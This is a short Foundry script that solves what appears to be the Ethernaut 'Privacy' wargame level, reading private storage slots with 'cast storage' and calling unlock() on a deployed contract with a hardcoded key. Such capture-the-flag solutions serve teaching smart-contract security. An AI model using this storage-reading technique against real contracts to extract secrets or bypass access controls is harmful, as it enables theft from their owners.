// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Privacy} from "../src/Privacy.sol";

/* Use cast storage to find the key 
* cast storage <address> 3  -> contructor data
* cast storage <address> 4  -> data2
* cast storage <address> 5  -> key data
*/

contract PrivacySolution is Script {
    Privacy public privacy = Privacy(0xAc5E43D90ea04C3f91BA2063693B2680565Dcd25);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        bytes32 key = 0x8e8ee03f276d5d252b1d6a0ee7347482a4ba3e72491adab380d808b5081c696c;
        privacy.unlock(bytes16(key));
        console.log("Locked: ", privacy.locked());
        vm.stopBroadcast();
    }
}
